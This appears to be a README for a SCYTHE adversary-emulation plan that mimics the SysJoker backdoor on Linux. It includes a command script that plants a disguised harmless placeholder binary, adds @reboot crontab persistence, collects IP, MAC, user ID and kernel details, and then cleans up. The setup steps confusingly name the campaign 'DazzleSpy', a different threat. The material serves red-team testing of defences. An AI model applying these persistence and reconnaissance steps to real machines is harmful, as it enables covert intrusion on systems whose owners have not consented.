## SysJoker

This threat is based on seveal different threat reports, 
- For macOS the [ObjectiveSee](https://www.objective-see.com/blog/blog_0x6C.html) threat report released on January 11,2022. 
- For Linux the [Intezer](https://www.intezer.com/blog/malware-analysis/new-backdoor-sysjoker/) threat report released January 11, 2022. 

## For Linux.

1. Download and import the threats in JSON format to your SCYTHE instace
2. Download the Virtual File System (VFS) files under DazzleSpy/VFS.
3.Create a new campaign DazzleSpy with HTTPS and the communication option. You can import the config.json or manually add `--cp yourdomain.com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 16`
4. Import Existing Threat: DazzleSpy
5. Start Campaign
6. Download Campaign Client
7. In ~/Downloads run chmod +x *.out 
8./*.out

## To Emulate
```
loader --load run
run mkdir -p ~/.Library/SystemServices
loader --load downloader
downloader --src '#!/bin/bash\n echo "SysJoker Beacon Malware would have run here" > ~/.Library/log.txt; ' --dest /tmp/scythe-sysjoker
loader --unload downloader
run cp -rf /tmp/scythe-sysjoker ~/.Library/SystemServices/updateSystem
run chmod +x ~/.Library/SystemServices/updateSystem
# add persistence
run crontab -l 2>/dev/null; echo "@reboot ~/.Library/SystemServices/updateSystem" | crontab -
run nohup ~/.Library/SystemServices/updateSystem >/dev/null 2>&1 &
run ifconfig | grep -v 127.0.0.1 | grep -E "inet ([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})" | awk '{print $2}'
run ip address | awk '/ether/{print $2}'
run id -u
run uname -mrs
# Cleanup
run rm -rf ~/.Library/SystemServices/updateSystem
run rm -rf ~/.Library/log.txt
run rmdir ~/.Library/SystemServices
run rmdir ~/.Library/
run crontab -l 2>/dev/null | grep -v "@reboot ~/.Library/SystemServices/updateSystem" | crontab -
loader --unload run
controller --shutdown
```
